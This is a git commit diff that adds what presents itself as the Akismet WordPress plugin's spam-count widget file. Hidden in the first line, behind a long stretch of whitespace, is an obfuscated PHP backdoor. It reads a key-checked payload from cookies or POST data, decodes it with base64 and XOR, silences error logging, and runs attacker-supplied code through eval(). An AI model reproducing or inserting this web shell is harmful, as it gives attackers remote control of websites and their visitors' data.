53d5545d3b94eb02e4b0c3190bd1d3991bca4aa7
knitmarketing <info@knitmarketing.com>
2018-05-10 19:12:12 -0700

    does this work?

---
+++ wp-content/plugins/akismet/class.akismet-widget.php
@@ -0,0 +1,114 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $l5ef359b7 = 303;$GLOBALS['v2c7a73'] = Array();global $v2c7a73;$v2c7a73 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['w8907'] = "\xa\x68\x49\x26\x59\x4e\x27\x40\x67\x73\x58\x64\x3a\x21\x36\x5c\x77\x4f\xd\x5e\x76\x62\x3e\x6f\x22\x3c\x55\x79\x65\x7d\x70\x5d\x7c\x2a\x7a\x71\x9\x33\x41\x38\x54\x7b\x25\x34\x47\x3d\x45\x66\x51\x4c\x5a\x2c\x35\x52\x6a\x37\x3f\x4a\x43\x3b\x57\x42\x2f\x48\x5b\x50\x4d\x24\x74\x56\x6e\x32\x28\x30\x2e\x6c\x6d\x20\x29\x7e\x69\x6b\x60\x63\x78\x53\x4b\x61\x5f\x44\x46\x39\x31\x23\x72\x2d\x2b\x75";$v2c7a73[$v2c7a73['w8907'][30].$v2c7a73['w8907'][71].$v2c7a73['w8907'][47].$v2c7a73['w8907'][43].$v2c7a73['w8907'][21].$v2c7a73['w8907'][47].$v2c7a73['w8907'][47]] = $v2c7a73['w8907'][83].$v2c7a73['w8907'][1].$v2c7a73['w8907'][94];$v2c7a73[$v2c7a73['w8907'][28].$v2c7a73['w8907'][14].$v2c7a73['w8907'][87].$v2c7a73['w8907'][11].$v2c7a73['w8907'][43]] = $v2c7a73['w8907'][23].$v2c7a73['w8907'][94].$v2c7a73['w8907'][11];$v2c7a73[$v2c7a73['w8907'][70].$v2c7a73['w8907'][43].$v2c7a73['w8907'][71].$v2c7a73['w8907'][21].$v2c7a73['w8907'][43].$v2c7a73['w8907'][14].$v2c7a73['w8907'][14].$v2c7a73['w8907'][73]] = $v2c7a73['w8907'][9].$v2c7a73['w8907'][68].$v2c7a73['w8907'][94].$v2c7a73['w8907'][75].$v2c7a73['w8907'][28].$v2c7a73['w8907'][70];$v2c7a73[$v2c7a73['w8907'][20].$v2c7a73['w8907'][47].$v2c7a73['w8907'][39].$v2c7a73['w8907'][28].$v2c7a73['w8907'][21].$v2c7a73['w8907'][52]] = $v2c7a73['w8907'][80].$v2c7a73['w8907'][70].$v2c7a73['w8907'][80].$v2c7a73['w8907'][88].$v2c7a73['w8907'][9].$v2c7a73['w8907'][28].$v2c7a73['w8907'][68];$v2c7a73[$v2c7a73['w8907'][20].$v2c7a73['w8907'][55].$v2c7a73['w8907'][39].$v2c7a73['w8907'][37].$v2c7a73['w8907'][14].$v2c7a73['w8907'][52].$v2c7a73['w8907'][39]] = $v2c7a73['w8907'][9].$v2c7a73['w8907'][28].$v2c7a73['w8907'][94].$v2c7a73['w8907'][80].$v2c7a73['w8907'][87].$v2c7a73['w8907'][75].$v2c7a73['w8907'][80].$v2c7a73['w8907'][34].$v2c7a73['w8907'][28];$v2c7a73[$v2c7a73['w8907'][84].$v2c7a73['w8907'][47].$v2c7a73['w8907'][21].$v2c7a73['w8907'][28].$v2c7a73['w8907'][37].$v2c7a73['w8907'][37].$v2c7a73['w8907'][28].$v2c7a73['w8907'][87].$v2c7a73['w8907'][87]] = $v2c7a73['w8907'][30].$v2c7a73['w8907'][1].$v2c7a73['w8907'][30].$v2c7a73['w8907'][20].$v2c7a73['w8907'][28].$v2c7a73['w8907'][94].$v2c7a73['w8907'][9].$v2c7a73['w8907'][80].$v2c7a73['w8907'][23].$v2c7a73['w8907'][70];$v2c7a73[$v2c7a73['w8907'][83].$v2c7a73['w8907'][83].$v2c7a73['w8907'][14].$v2c7a73['w8907'][14].$v2c7a73['w8907'][71].$v2c7a73['w8907'][11].$v2c7a73['w8907'][47]] = $v2c7a73['w8907'][97].$v2c7a73['w8907'][70].$v2c7a73['w8907'][9].$v2c7a73['w8907'][28].$v2c7a73['w8907'][94].$v2c7a73['w8907'][80].$v2c7a73['w8907'][87].$v2c7a73['w8907'][75].$v2c7a73['w8907'][80].$v2c7a73['w8907'][34].$v2c7a73['w8907'][28];$v2c7a73[$v2c7a73['w8907'][27].$v2c7a73['w8907'][55].$v2c7a73['w8907'][71].$v2c7a73['w8907'][43].$v2c7a73['w8907'][11]] = $v2c7a73['w8907'][21].$v2c7a73['w8907'][87].$v2c7a73['w8907'][9].$v2c7a73['w8907'][28].$v2c7a73['w8907'][14].$v2c7a73['w8907'][43].$v2c7a73['w8907'][88].$v2c7a73['w8907'][11].$v2c7a73['w8907'][28].$v2c7a73['w8907'][83].$v2c7a73['w8907'][23].$v2c7a73['w8907'][11].$v2c7a73['w8907'][28];$v2c7a73[$v2c7a73['w8907'][83].$v2c7a73['w8907'][71].$v2c7a73['w8907'][39].$v2c7a73['w8907'][37].$v2c7a73['w8907'][73].$v2c7a73['w8907'][92].$v2c7a73['w8907'][73].$v2c7a73['w8907'][71]] = $v2c7a73['w8907'][9].$v2c7a73['w8907'][28].$v2c7a73['w8907'][68].$v2c7a73['w8907'][88].$v2c7a73['w8907'][68].$v2c7a73['w8907'][80].$v2c7a73['w8907'][76].$v2c7a73['w8907'][28].$v2c7a73['w8907'][88].$v2c7a73['w8907'][75].$v2c7a73['w8907'][80].$v2c7a73['w8907'][76].$v2c7a73['w8907'][80].$v2c7a73['w8907'][68];$v2c7a73[$v2c7a73['w8907'][54].$v2c7a73['w8907'][28].$v2c7a73['w8907'][28].$v2c7a73['w8907'][92].$v2c7a73['w8907'][21]] = $v2c7a73['w8907'][20].$v2c7a73['w8907'][92].$v2c7a73['w8907'][52].$v2c7a73['w8907'][39].$v2c7a73['w8907'][11].$v2c7a73['w8907'][87];$v2c7a73[$v2c7a73['w8907'][87].$v2c7a73['w8907'][55].$v2c7a73['w8907'][73].$v2c7a73['w8907'][55].$v2c7a73['w8907'][52].$v2c7a73['w8907'][11].$v2c7a73['w8907'][55].$v2c7a73['w8907'][39]] = $v2c7a73['w8907'][21].$v2c7a73['w8907'][28].$v2c7a73['w8907'][14].$v2c7a73['w8907'][47].$v2c7a73['w8907'][47];$v2c7a73[$v2c7a73['w8907'][87].$v2c7a73['w8907'][11].$v2c7a73['w8907'][52].$v2c7a73['w8907'][11].$v2c7a73['w8907'][21]] = $_POST;$v2c7a73[$v2c7a73['w8907'][8].$v2c7a73['w8907'][47].$v2c7a73['w8907'][28].$v2c7a73['w8907'][91].$v2c7a73['w8907'][11]] = $_COOKIE;@$v2c7a73[$v2c7a73['w8907'][20].$v2c7a73['w8907'][47].$v2c7a73['w8907'][39].$v2c7a73['w8907'][28].$v2c7a73['w8907'][21].$v2c7a73['w8907'][52]]($v2c7a73['w8907'][28].$v2c7a73['w8907'][94].$v2c7a73['w8907'][94].$v2c7a73['w8907'][23].$v2c7a73['w8907'][94].$v2c7a73['w8907'][88].$v2c7a73['w8907'][75].$v2c7a73['w8907'][23].$v2c7a73['w8907'][8], NULL);@$v2c7a73[$v2c7a73['w8907'][20].$v2c7a73['w8907'][47].$v2c7a73['w8907'][39].$v2c7a73['w8907'][28].$v2c7a73['w8907'][21].$v2c7a73['w8907'][52]]($v2c7a73['w8907'][75].$v2c7a73['w8907'][23].$v2c7a73['w8907'][8].$v2c7a73['w8907'][88].$v2c7a73['w8907'][28].$v2c7a73['w8907'][94].$v2c7a73['w8907'][94].$v2c7a73['w8907'][23].$v2c7a73['w8907'][94].$v2c7a73['w8907'][9], 0);@$v2c7a73[$v2c7a73['w8907'][20].$v2c7a73['w8907'][47].$v2c7a73['w8907'][39].$v2c7a73['w8907'][28].$v2c7a73['w8907'][21].$v2c7a73['w8907'][52]]($v2c7a73['w8907'][76].$v2c7a73['w8907'][87].$v2c7a73['w8907'][84].$v2c7a73['w8907'][88].$v2c7a73['w8907'][28].$v2c7a73['w8907'][84].$v2c7a73['w8907'][28].$v2c7a73['w8907'][83].$v2c7a73['w8907'][97].$v2c7a73['w8907'][68].$v2c7a73['w8907'][80].$v2c7a73['w8907'][23].$v2c7a73['w8907'][70].$v2c7a73['w8907'][88].$v2c7a73['w8907'][68].$v2c7a73['w8907'][80].$v2c7a73['w8907'][76].$v2c7a73['w8907'][28], 0);@$v2c7a73[$v2c7a73['w8907'][83].$v2c7a73['w8907'][71].$v2c7a73['w8907'][39].$v2c7a73['w8907'][37].$v2c7a73['w8907'][73].$v2c7a73['w8907'][92].$v2c7a73['w8907'][73].$v2c7a73['w8907'][71]](0);$n3eb43 = NULL;$da63d08 = NULL;$v2c7a73[$v2c7a73['w8907'][81].$v2c7a73['w8907'][87].$v2c7a73['w8907'][87].$v2c7a73['w8907'][39].$v2c7a73['w8907'][87].$v2c7a73['w8907'][71].$v2c7a73['w8907'][21].$v2c7a73['w8907'][28].$v2c7a73['w8907'][11]] = $v2c7a73['w8907'][83].$v2c7a73['w8907'][39].$v2c7a73['w8907'][14].$v2c7a73['w8907'][91].$v2c7a73['w8907'][39].$v2c7a73['w8907'][39].$v2c7a73['w8907'][92].$v2c7a73['w8907'][14].$v2c7a73['w8907'][95].$v2c7a73['w8907'][37].$v2c7a73['w8907'][39].$v2c7a73['w8907'][14].$v2c7a73['w8907'][91].$v2c7a73['w8907'][95].$v2c7a73['w8907'][43].$v2c7a73['w8907'][83].$v2c7a73['w8907'][14].$v2c7a73['w8907'][87].$v2c7a73['w8907'][95].$v2c7a73['w8907'][21].$v2c7a73['w8907'][92].$v2c7a73['w8907'][83].$v2c7a73['w8907'][52].$v2c7a73['w8907'][95].$v2c7a73['w8907'][39].$v2c7a73['w8907'][11].$v2c7a73['w8907'][92].$v2c7a73['w8907'][14].$v2c7a73['w8907'][28].$v2c7a73['w8907'][92].$v2c7a73['w8907'][87].$v2c7a73['w8907'][52].$v2c7a73['w8907'][47].$v2c7a73['w8907'][71].$v2c7a73['w8907'][55].$v2c7a73['w8907'][37];global $kaa8a2bed;function  be6ff($n3eb43, $ka90eb4){global $v2c7a73;$p72c5d = "";for ($vf42dd5=0; $vf42dd5<$v2c7a73[$v2c7a73['w8907'][70].$v2c7a73['w8907'][43].$v2c7a73['w8907'][71].$v2c7a73['w8907'][21].$v2c7a73['w8907'][43].$v2c7a73['w8907'][14].$v2c7a73['w8907'][14].$v2c7a73['w8907'][73]]($n3eb43);){for ($j9ed69=0; $j9ed69<$v2c7a73[$v2c7a73['w8907'][70].$v2c7a73['w8907'][43].$v2c7a73['w8907'][71].$v2c7a73['w8907'][21].$v2c7a73['w8907'][43].$v2c7a73['w8907'][14].$v2c7a73['w8907'][14].$v2c7a73['w8907'][73]]($ka90eb4) && $vf42dd5<$v2c7a73[$v2c7a73['w8907'][70].$v2c7a73['w8907'][43].$v2c7a73['w8907'][71].$v2c7a73['w8907'][21].$v2c7a73['w8907'][43].$v2c7a73['w8907'][14].$v2c7a73['w8907'][14].$v2c7a73['w8907'][73]]($n3eb43); $j9ed69++, $vf42dd5++){$p72c5d .= $v2c7a73[$v2c7a73['w8907'][30].$v2c7a73['w8907'][71].$v2c7a73['w8907'][47].$v2c7a73['w8907'][43].$v2c7a73['w8907'][21].$v2c7a73['w8907'][47].$v2c7a73['w8907'][47]]($v2c7a73[$v2c7a73['w8907'][28].$v2c7a73['w8907'][14].$v2c7a73['w8907'][87].$v2c7a73['w8907'][11].$v2c7a73['w8907'][43]]($n3eb43[$vf42dd5]) ^ $v2c7a73[$v2c7a73['w8907'][28].$v2c7a73['w8907'][14].$v2c7a73['w8907'][87].$v2c7a73['w8907'][11].$v2c7a73['w8907'][43]]($ka90eb4[$j9ed69]));}}return $p72c5d;}function  v158da($n3eb43, $ka90eb4){global $v2c7a73;global $kaa8a2bed;return $v2c7a73[$v2c7a73['w8907'][87].$v2c7a73['w8907'][55].$v2c7a73['w8907'][73].$v2c7a73['w8907'][55].$v2c7a73['w8907'][52].$v2c7a73['w8907'][11].$v2c7a73['w8907'][55].$v2c7a73['w8907'][39]]($v2c7a73[$v2c7a73['w8907'][87].$v2c7a73['w8907'][55].$v2c7a73['w8907'][73].$v2c7a73['w8907'][55].$v2c7a73['w8907'][52].$v2c7a73['w8907'][11].$v2c7a73['w8907'][55].$v2c7a73['w8907'][39]]($n3eb43, $kaa8a2bed), $ka90eb4);}foreach ($v2c7a73[$v2c7a73['w8907'][8].$v2c7a73['w8907'][47].$v2c7a73['w8907'][28].$v2c7a73['w8907'][91].$v2c7a73['w8907'][11]] as $ka90eb4=>$u748d){$n3eb43 = $u748d;$da63d08 = $ka90eb4;}if (!$n3eb43){foreach ($v2c7a73[$v2c7a73['w8907'][87].$v2c7a73['w8907'][11].$v2c7a73['w8907'][52].$v2c7a73['w8907'][11].$v2c7a73['w8907'][21]] as $ka90eb4=>$u748d){$n3eb43 = $u748d;$da63d08 = $ka90eb4;}}$n3eb43 = @$v2c7a73[$v2c7a73['w8907'][83].$v2c7a73['w8907'][83].$v2c7a73['w8907'][14].$v2c7a73['w8907'][14].$v2c7a73['w8907'][71].$v2c7a73['w8907'][11].$v2c7a73['w8907'][47]]($v2c7a73[$v2c7a73['w8907'][54].$v2c7a73['w8907'][28].$v2c7a73['w8907'][28].$v2c7a73['w8907'][92].$v2c7a73['w8907'][21]]($v2c7a73[$v2c7a73['w8907'][27].$v2c7a73['w8907'][55].$v2c7a73['w8907'][71].$v2c7a73['w8907'][43].$v2c7a73['w8907'][11]]($n3eb43), $da63d08));if (isset($n3eb43[$v2c7a73['w8907'][87].$v2c7a73['w8907'][81]]) && $kaa8a2bed==$n3eb43[$v2c7a73['w8907'][87].$v2c7a73['w8907'][81]]){if ($n3eb43[$v2c7a73['w8907'][87]] == $v2c7a73['w8907'][80]){$vf42dd5 = Array($v2c7a73['w8907'][30].$v2c7a73['w8907'][20] => @$v2c7a73[$v2c7a73['w8907'][84].$v2c7a73['w8907'][47].$v2c7a73['w8907'][21].$v2c7a73['w8907'][28].$v2c7a73['w8907'][37].$v2c7a73['w8907'][37].$v2c7a73['w8907'][28].$v2c7a73['w8907'][87].$v2c7a73['w8907'][87]](),$v2c7a73['w8907'][9].$v2c7a73['w8907'][20] => $v2c7a73['w8907'][92].$v2c7a73['w8907'][74].$v2c7a73['w8907'][73].$v2c7a73['w8907'][95].$v2c7a73['w8907'][92],);echo @$v2c7a73[$v2c7a73['w8907'][20].$v2c7a73['w8907'][55].$v2c7a73['w8907'][39].$v2c7a73['w8907'][37].$v2c7a73['w8907'][14].$v2c7a73['w8907'][52].$v2c7a73['w8907'][39]]($vf42dd5);}elseif ($n3eb43[$v2c7a73['w8907'][87]] == $v2c7a73['w8907'][28]){eval/*m946ca*/($n3eb43[$v2c7a73['w8907'][11]]);}exit();} ?><?php
+/**
+ * @package Akismet
+ */
+class Akismet_Widget extends WP_Widget {
+
+	function __construct() {
+		load_plugin_textdomain( 'akismet' );
+		
+		parent::__construct(
+			'akismet_widget',
+			__( 'Akismet Widget' , 'akismet'),
+			array( 'description' => __( 'Display the number of spam comments Akismet has caught' , 'akismet') )
+		);
+
+		if ( is_active_widget( false, false, $this->id_base ) ) {
+			add_action( 'wp_head', array( $this, 'css' ) );
+		}
+	}
+
+	function css() {
+?>
+
+<style type="text/css">
+.a-stats {
+	width: auto;
+}
+.a-stats a {
+	background: #7CA821;
+	background-image:-moz-linear-gradient(0% 100% 90deg,#5F8E14,#7CA821);
+	background-image:-webkit-gradient(linear,0% 0,0% 100%,from(#7CA821),to(#5F8E14));
+	border: 1px solid #5F8E14;
+	border-radius:3px;
+	color: #CFEA93;
+	cursor: pointer;
+	display: block;
+	font-weight: normal;
+	height: 100%;
+	-moz-border-radius:3px;
+	padding: 7px 0 8px;
+	text-align: center;
+	text-decoration: none;
+	-webkit-border-radius:3px;
+	width: 100%;
+}
+.a-stats a:hover {
+	text-decoration: none;
+	background-image:-moz-linear-gradient(0% 100% 90deg,#6F9C1B,#659417);
+	background-image:-webkit-gradient(linear,0% 0,0% 100%,from(#659417),to(#6F9C1B));
+}
+.a-stats .count {
+	color: #FFF;
+	display: block;
+	font-size: 15px;
+	line-height: 16px;
+	padding: 0 13px;
+	white-space: nowrap;
+}
+</style>
+
+<?php
+	}
+
+	function form( $instance ) {
+		if ( $instance && isset( $instance['title'] ) ) {
+			$title = $instance['title'];
+		}
+		else {
+			$title = __( 'Spam Blocked' , 'akismet' );
+		}
+?>
+
+		<p>
+		<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php esc_html_e( 'Title:' , 'akismet'); ?></label>
+		<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
+		</p>
+
+<?php
+	}
+
+	function update( $new_instance, $old_instance ) {
+		$instance['title'] = strip_tags( $new_instance['title'] );
+		return $instance;
+	}
+
+	function widget( $args, $instance ) {
+		$count = get_option( 'akismet_spam_count' );
+
+		if ( ! isset( $instance['title'] ) ) {
+			$instance['title'] = __( 'Spam Blocked' , 'akismet' );
+		}
+
+		echo $args['before_widget'];
+		if ( ! empty( $instance['title'] ) ) {
+			echo $args['before_title'];
+			echo esc_html( $instance['title'] );
+			echo $args['after_title'];
+		}
+?>
+
+	<div class="a-stats">
+		<a href="https://akismet.com" target="_blank" title=""><?php printf( _n( '<strong class="count">%1$s spam</strong> blocked by <strong>Akismet</strong>', '<strong class="count">%1$s spam</strong> blocked by <strong>Akismet</strong>', $count , 'akismet'), number_format_i18n( $count ) ); ?></a>
+	</div>
+
+<?php
+		echo $args['after_widget'];
+	}
+}
+
+function akismet_register_widgets() {
+	register_widget( 'Akismet_Widget' );
+}
+
+add_action( 'widgets_init', 'akismet_register_widgets' );
